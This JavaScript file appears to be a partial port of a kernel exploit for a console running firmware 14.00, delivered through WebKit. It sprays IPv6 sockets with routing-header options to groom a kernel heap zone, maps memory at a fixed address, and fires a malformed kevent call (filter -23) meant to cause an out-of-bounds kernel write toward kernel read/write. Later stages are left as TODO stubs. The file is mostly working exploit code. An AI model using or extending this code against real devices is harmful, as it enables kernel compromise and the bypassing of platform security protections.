import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

// ============================================================================
// hx_kevent.js — WebKit port of Hx1400.probe() (BD-J) for FW 14.00
// Bug: kevent(filter=-23) -> OOB in kernel filter-ops table -> 8-byte write
// into a groomed zone-256 object -> fakeops pivot -> kernel R/W.
// ac(u,NUM,..)=ctx.sc(NUM,..) | Unsafe getLong/putLong=ctx.p.read8/write8
// Uses ctx().stubAddr (stage-1 syscall stub map), NOT dynsym: 14.00 libkernel
// is mapped without ELF headers (NATIVES-PROBE confirms), so in-memory
// dynsym parsing is impossible. Syscall numbers come from the bytecode.
// ============================================================================

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  close: 6,
  socket: 97, socketpair: 135,
  setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;              // zone-256 arm
const GIDENT_LO = 0x4146424f;     // gIDENTJ = 0x313434314146424f
const GIDENT_HI = 0x31343431;
const EV_ADD = 1;

const STATE = { ctx: null, kbase: 0n };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + Number(v).toString(16);
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name];
  const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name + " (" + n + ")");
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}

// ---------- arena ----------
const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function put64(buf, off, v) { buf.dv.setUint32(off, Number(num(v) & 0xffffffffn), true); buf.dv.setUint32(off + 4, Number((num(v) >> 32n) & 0xffffffffn), true); }
function put16(buf, off, v) { buf.dv.setUint16(off, v & 0xffff, true); }

// ---------- node chains (0x38 nodes, RTHDR-exploit style) ----------
const NODE_SZ = 0x38;
function buildNodes(buf, list) {
  const base = buf.addr;
  for (let i = 0; i < list.length; i++) {
    const o = i * NODE_SZ, nd = list[i];
    put64(buf, o + 0x00, nd.dec);
    put64(buf, o + 0x08, nd.sink);
    put64(buf, o + 0x10, 0);
    put64(buf, o + 0x30, nd.next_idx < 0 ? 0 : base + BigInt(nd.next_idx * NODE_SZ));
  }
}

// ---------- phases ----------
function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) {
    const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
    if (fd <= 0) break;
    fds.push(fd);
  }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) {
    scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  }
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

function fireKevent(kq, cl, ident) {
  for (let i = 0; i < 8; i++) put64(cl, i * 8, 0);
  put64(cl, 0x00, ident);
  put16(cl, 0x08, -23);
  put16(cl, 0x0A, EV_ADD);
  const rc = scn("kevent", kq, cl.addr, 1, 0, 0, 0);
  log("KEVENT-23", "kq=" + kq + " rc=" + rc + " ident=" + h16(ident));
  if (rc !== 0) fin("kevent rc=" + rc + " errno=" + ctx().errno());
  return rc;
}

function TODO(where) { fin("TODO: " + where + " (next port pass)"); }

export async function runKevent(c) {
  STATE.ctx = c;
  if (!c.kbase) fin("kbase not provided - run route leak first");
  STATE.kbase = num(c.kbase);
  log("KEVENT-PORT", "kbase=" + h16(STATE.kbase));

  const magic = ctx().p.read4(toI64(ctx().libkernelBase)) >>> 0;
  log("NATIVES-PROBE", "elf_magic=0x" + magic.toString(16) + " (0x464c457f=headers-mapped)");
  const need = Object.keys(NUM);
  const missing = need.filter((k) => !ctx().stubAddr.has(NUM[k]));
  if (missing.length)
    fin("stubs missing: " + missing.map((k) => k + "=" + NUM[k]).join(" "));
  log("NATIVES", need.map((k) => k + "=" + NUM[k] + "@0x" +
      num(ctx().stubAddr.get(NUM[k])).toString(16)).join(" "));

  const scratch16a = allocBuf(16), scratch16b = allocBuf(16);
  const buf32k = allocBuf(32768);
  const buf200 = allocBuf(200);
  const rth = allocBuf(512);
  const cl = allocBuf(64);
  log("ARENA", "blocks allocated");

  const anchorFd = scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const victimCount = 8;
  const victims = [];
  for (let i = 0; i < victimCount; i++) {
    victims.push(scn("socket", AF_INET, SOCK_STREAM, 0));
  }
  log("VICTIMS", "anchor=" + anchorFd + " victims=" + victims.join(","));

  const { fds } = phaseSpray(256);

  const raw = num(ctx().bufAddr(new ArrayBuffer(16384)));
  const page = raw & ~0x3fffn;
  const mr = scn("mmap", page, 16384, 3, 4114, -1, 0);
  log("MMAP-FIXED", "want=" + h16(page) + " got=" + h16(mr));
  if (mr !== page) fin("mmap fixed " + h16(mr));

  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");
  fireKevent(leakKq, cl, (BigInt(GIDENT_HI) << 32n) | BigInt(GIDENT_LO));

  TODO("node-walk builder + victim kva scan (region pc 7000-7700)");

  log("SLOT", "R_SLOT=" + h16(ka(P[13])) + " R_OPS=" + h16(ka(P[14])));
  TODO("E-gadget chains + readback (region pc 7950-8368)");

  TODO("root kqueue hook (region pc 9000-9300)");

  log("KEVENT-STAGE1-PARTIAL", "phases through leak-fire ported; continuation pending");
  return false;
}
